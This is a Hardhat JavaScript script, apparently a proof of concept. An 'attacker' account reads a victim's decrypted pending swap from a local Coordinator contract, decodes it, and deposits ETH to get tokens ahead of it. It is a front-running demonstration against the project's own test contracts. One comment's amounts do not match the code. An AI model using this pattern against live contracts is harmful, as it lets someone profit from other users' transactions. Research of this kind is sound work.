const hre = require("hardhat");
const fs = require("fs");
const { ethers, Interface } = require("ethers");

async function main() {
    // load address from deployments.json
    const addresses = JSON.parse(fs.readFileSync("scripts/deployments.json", "utf8"));
    const tokenA = addresses.tokenA;
    const coordinator = addresses.coordinator;

    const signer = await hre.ethers.getSigners();
    const attacker = signer[2]; // Pick signer[2], attacker's account

    // Get ABI from the contract factory
    const Token = await hre.ethers.getContractFactory("Token");
    const Coordinator = await hre.ethers.getContractFactory("Coordinator");

    // Create a contract instances
    const TokenA = new ethers.Contract(tokenA, Token.interface, attacker);
    const CordinatoR = new ethers.Contract(coordinator, Coordinator.interface, attacker);

    const index = 1; // victim's tx
    const [addr, payload] = await CordinatoR.getDecryptedTx(index);
    console.log("Victim: Target address:",addr);
    console.log("Victim: Payload:",payload);

    // Define the ABI of the function
    const abi = ["function swap(address tokenIn, uint256 amountIn)"];
    const iface = new Interface(abi);

    // Decode the function data
    const decoded = iface.decodeFunctionData("swap", payload);

    // Access the decoded values
    console.log("Decoded tokenIn address:", decoded.tokenIn);
    console.log("Decoded amountIn:", decoded.amountIn.toString());

    const opportunity = true; // can implement custom logic
    if(opportunity)
    {
      // deposit token
      // attacker deposits 1 ETH (100Token A) to Coordinator, triggering minting tokens to attacker
      const depositTx = await CordinatoR.connect(attacker).deposit(await TokenA.getAddress(), {value: hre.ethers.parseEther("20")});
      await depositTx.wait();
      console.log("Deposit transaction done");
      // Check user tokenA balance after deposit
      const balance = await TokenA.balanceOf(await attacker.getAddress());
      console.log("Attacker tokenA balance after deposit:", hre.ethers.formatEther(balance));
    }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});